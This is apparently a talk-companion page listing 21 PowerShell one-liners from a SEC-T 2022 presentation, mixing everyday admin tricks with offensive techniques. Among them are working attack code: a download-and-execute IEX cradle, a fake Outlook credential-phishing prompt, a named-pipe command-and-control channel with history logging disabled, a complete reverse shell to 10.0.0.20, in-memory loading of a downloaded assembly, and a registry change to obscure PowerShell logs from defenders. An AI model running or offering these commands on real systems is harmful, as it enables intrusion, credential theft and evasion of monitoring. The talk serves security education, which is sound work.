<h1 style="color: #5e9ca0;"><span style="color: #008080;">When SysAdmin & Hacker Unite: 21 One-Liners to make you convert from bash to Powershell</span></h1>
<hr />
<h3 style="color: #2e6c80;"><span style="color: #333399;">Code & Slides from SEC-T 2022 talk</span></h3>
<p><strong>Comments and feedback welcome are <a href="mailto:yossis@protonmail.com" target="_blank"><span style="color: #333333;">welcome</span></a></strong></p>
<hr />
<h2 style="color: #2e6c80;">Slides &amp; video:</h2>
<a title="Talk video on Youtube" href="https://www.youtube.com/watch?v=4iAM76n1b5o" target="_blank"><strong>Talk video on Youtube</string></a></span> <span style="color: #000000;">
<p><a href="bash-to-Powershell-OneLiners_SEC-T_2022_YossiSassi.pdf" target="_blank"><strong>Slides</strong></a> - Presentation slides in PDF</p>
<hr />
<h2 style="color: #2e6c80;">Code & Scripts:</h2>
<p><b># 1. Text to speech + potential exfil data via audio/console beep</p></b>
<p>(new-Object -ComObject sapi.spvoice).speak("hey everyone")</p>
<p>(new-Object -ComObject sapi.spvoice).speak($(cat c:\temp\speak.txt))</p>
<p>[console]::beep(440,1000)</p>

<p><b># 2. Lots of functionality; Minimum syntax; Living off the land</p></b>
<p># e.g. Crash a Ryzen system in single line of tweetable PowerShell - https://twitter.com/aionescu/status/1393798004151181312</p>
<p>(Get-NtFile \Device\NTPNP_PCI0031).DeviceIoControl(0x9C402400, 5, 5)</p>

<p><b># 3. Pipe ip addresses, curl (get ipinfo), convert from JSON, open in ad-hoc Grid</p></b>
<p>$IPs = "151.101.17.67", "192.12.94.30", "192.26.92.30"</p>
<p>$IPs | foreach {curl ipinfo.io/$_/json | ConvertFrom-Json} | ogv</p>

<p><b># 4. What the hex?!</p></b>
<p>Format-Hex C:\Temp\disk.exe| more</p>
<p>"GUID" | format-hex</p>
<p>Format-Hex C:\Temp\disk.exe| sls '47 55 49 44'</p>

<p><b># 5. Invoke/execute any text stream</p></b>
<p>"gwmi win32_Bios" | IEX</p>
<p>IEX (new-object net.webclient).downloadstring("http://myserver.com/payload.htm")</p>
<p>curl http://myserver.com/payload.htm | IEX</p>
<p># note: See session presentation for more options & code</p>

<p><b># 6. Randomize stuff</p></b>
<p>Get-Random -InputObject (cat C:\temp\words.txt)</p> 
<p>Get-Random -InputObject (cat C:\temp\words.txt) -SetSeed 1</p>
<p>Get-Random -InputObject (cat C:\temp\words.txt) -SetSeed 2 -Count 3</p>
<p>Get-Random -Minimum 1 -Maximum 100</p>

<p><b># 7. cool output/selection</p></b>
<p>gcm prompt | select -ExpandProperty definition</p>
<p>function prompt {$host.ui.RawUI.WindowTitle=pwd;"$(get-date)>"}</p>
<p>ps | Out-GridView -OutputMode Multiple</p>
<p>ps | Out-ConsoleGridView # (might need to add the module ->  install-Module Microsoft.PowerShell.ConsoleGuiTools)</p>

<p><b># 8. Harness the power of .net</p></b>
<p>[Net.WebUtility]::UrlEncode("/insider profiles/")</p>
<p>[math]::Round(89.887,1)</p>
<p>[char]::IsPunctuation("!")</p>
<p>[console]::CapsLock</p>
<p>("heLlo wOrld").ToCharArray() | % { [char]::IsUpper($_)}</p>
<p>[convert]::ToBase64String($([System.Text.Encoding]::Unicode.GetBytes("shutdown /r /t 0")))</p>

<p><b># 9. compare anything to anything</p></b>
<p>compare (cat .\hosts.txt) (cat .\hosts2.txt)</p>
<p>compare (cat .\hosts.txt) (cat .\hosts2.txt) -IncludeEqual -ExcludeDifferent</p>

<p><b># 10. convert any to any</p></b>
<p>ps explorer | ConvertTo-Json</p>
<p>ps explorer | ConvertTo-Csv # can add params, e.g -Delimiter "`t"</p>
<p>ps explorer | ConvertTo-Html # can utilize params such as -PreContent, -PostContent, -Body, -Head, -CssUri etc'</p>
<p>ps explorer | ConvertTo-Xml</p>
<p>ps explorer | Export-Clixml c:\temp\ps-explorer.xml</p>
<p>[System.BitConverter]::ToString($([io.file]::ReadAllBytes("c:\temp\file.exe")))</p>
<br>
<p>$b = [io.file]::ReadAllBytes("c:\temp\file.exe")</p>
<p>($b | foreach { $_.ToString("X2") }) -join ""</p>
<br>
<p><b># 11. One liner Credential phishing</p></b>
<p>$c = $Host.ui.PromptForCredential("Microsoft Outlook","Please enter your credentials","$env:userdomain\$env:username","")</p>
<p>$c.GetNetworkCredential() | fl *</p>

<p><b># 12. Named-Pipe/SMB One-liner (Exfil data/C2 with No socket bind)</p></b>
<p>#- Server stream</p>
<p>$pipe = new-object System.IO.Pipes.NamedPipeServerStream 'mypipe','Out'</p>
<p>$pipe.WaitForConnection()</p>
<p>$sw = new-object System.IO.StreamWriter $pipe</p>
<p>$sw.AutoFlush = $true</p>
<p>$sw.WriteLine("whoami")</p>
<p>#$sw.Dispose() # terminates the stream</p>
<p>#$pipe.Dispose()</p>
<p>#- Client stream</p>
<p>Set-PSReadLineOption -HistorySaveStyle SaveNothing</p>
<p>$pipe = new-object System.IO.Pipes.NamedPipeClientStream ’10.0.0.1','mypipe','In'</p>
<p>$pipe.Connect()</p>
<p>$sr = new-object System.IO.StreamReader $pipe</p>
<p>while (($data = $sr.ReadLine()) -ne $null) { iex $data }</p>
<p>#$sr.Dispose()</p>
<p>#$pipe.Dispose()</p>

<p><b># 13. One-liner Rev Shell</p></b>
<p>#- nc -p 443 -l</p>
<p>$sm=(New-Object Net.Sockets.TCPClient('10.0.0.20',443)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}</p>
<p>#- client</p>
<p>$c=New-Object System.Net.Sockets.TCPClient('10.0.0.20',443);$st = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $st.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2  = $sb + 'PS ' + (pwd).Path + '> ';$sb1 = ([text.encoding]::ASCII).GetBytes($sb2);$st.Write($sb1,0,$sb1.Length);$st.Flush()};$c.Close()</p>

<p><b># 14 + 15 -> There is no spoon...</p></b>
<p># Invoke powershell code from binary (or url) without launching powershell.exe or the actual binary process itself</p>
<p>function global:Invoke-InMemory {</p>
<p>[CmdletBinding()]</p>
<p>Param(</p>
<p>[String]$Path,</p>
<p>[String]$EncodedPayload</p>
<p>)</p>
<p>$source = @"</p>
<p>using System;</p>
<p>using System.Net;</p>
<p>using System.Reflection;</p>
<p>namespace mstsc</p>
<p>{</p>
<p>    public static class csharp</p>
<p>    {</p>
<p>        public static void LoadBinary(string url, string payload)</p>
<p>        {</p>
<p>        WebClient wc = new WebClient();</p>
<p>        Byte[] buffer = wc.DownloadData(url);</p>
<p>            var assembly = Assembly.Load(buffer);</p>
<p>var entry = assembly.EntryPoint;</p>
<p>var args = new string[2] {"-enc", payload};</p>
<p>var nothing = entry.Invoke(null, new object[] { args });</p>
<p>        }</p>
<p>    }</p>
<p>}</p>
<p>"@</p>
<p>if (-not ([System.Management.Automation.PSTypeName]'mstsc.csharp').Type)</p>
<p>{</p>
<p>    Add-Type -ReferencedAssemblies $Assem -TypeDefinition $source -Language CSharp</p>
<p>}</p>
<p>[mstsc.csharp]::LoadBinary($Path, $EncodedPayload)</p>
<p>}</p>

<p><b># 16. Run C# directly</p></b> 
<p>$x = @'</p>
<p>public class test</p>
<p>{</p>
<p>    public static string Identity()</p>
<p>        {</p>
<p>            string Name = System.Security.Principal.WindowsIdentity.GetCurrent().Name; </p>
<p>            return Name;</p>
<p>        }</p>
<p>}</p>
<p>'@</p>

<p>Add-Type $x;</p>
<p>[test]::Identity()</p>

<p><b># 16b. Invoke local variables & functions in Remote sessions</p></b>
<p>$x = "my local var"</p>
<p>Invoke-Command -session (Get-PSSession)[0] -scriptblock {$using:x}</p>
<p></p>
<p>function Get-Hostname {"running on $env:ComputerName"}</p>
<p>Invoke-Command -session (Get-PSSession)[0] -scriptblock ${function:Get-Hostname}</p>

<p><b># 17. Get objects from apps/tools - convert strings without RegEx</p></b>
<p>$ns = @'</p>
<p></p>
<p>Active Connections</p>
<p></p>
<p>  Proto  Local Address          Foreign Address        State           PID</p>
<p>  TCP    {LocalAddress*:0.0.0.0}:{LocalPort:135}            {RemoteAddress:0.0.0.0}:{RemotePort:0}              {State:LISTENING}       {PID:1052}</p>
<p>  TCP    {LocalAddress*:192.168.43.141}:{LocalPort:63152}   {RemoteAddress:185.70.40.151}:{RemotePort:443}      {State:ESTABLISHED}     {PID:11360}</p>
<p>'@</p>
<p></p>
<p>netstat -ano | ConvertFrom-String -TemplateContent $ns | more</p>
<p>$net = netstat -ano | ConvertFrom-String -TemplateContent $ns</p>
<p>$net | ? state -eq "established"</p>
<p>$net | ConvertTo-Json # etc..</p>

<p><b># 18. Use Protected Event Logging against the defense (need to create a Document Encryption cert first)</p></b>
<p># before</p>
<p>Get-WinEvent -FilterHashtable @{logname='Microsoft-Windows-PowerShell/Operational'} -MaxEvents 1 | select -expandProperty message | more</p>
<p># configure to use CMS public certificate</p>
<p>New-Item "HKLM:\Software\Policies\Microsoft\Windows\EventLog\ProtectedEventLogging" -Force</p>
<p>Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\EventLog\ProtectedEventLogging" -Name EnableProtectedEventLogging -Value 1</p>
<p>Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\EventLog\ProtectedEventLogging" -Name EncryptionCertificate -Value (dir Cert:\CurrentUser\my)[0].Thumbprint</p>
<p># after (run some powershell commands first, to populate new events into Microsoft->Windows->Powershell->Operational event log</p>
<p>Get-WinEvent -FilterHashtable @{logname='Microsoft-Windows-PowerShell/Operational'} -MaxEvents 1 | select -expandProperty message | more</p>

<p><b># 19. Invisi-shell</p></b>
<p># https://github.com/YossiSassi/Invisi-Shell</p>

<p><b># 20. JEA - Just Enough Access - Constrained remote access</p></b>
<p># https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.2 </p>

<p><b># 21. Sudo on windows</p></b>
<p>Function sudo {param([Parameter(Mandatory)][string]$FilePath,[Parameter(ValueFromRemainingArguments)][string[]]$ArgumentList) Start-Process @PSBoundParameters -Verb Runas}</p>
<p>sudo cmd "/k whoami /priv"</p>
<p>&nbsp;</p>
